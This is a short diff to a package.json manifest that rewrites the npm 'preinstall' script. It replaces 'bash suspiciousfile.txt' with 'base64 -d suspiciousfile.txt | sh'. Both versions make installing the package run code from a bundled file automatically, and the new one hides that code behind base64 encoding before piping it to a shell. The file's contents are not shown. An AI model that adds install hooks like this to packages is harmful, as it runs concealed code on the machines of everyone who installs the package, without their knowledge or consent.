@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "preinstall": "bash suspiciousfile.txt",
+    "preinstall": "base64 -d suspiciousfile.txt | sh",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "repository": {
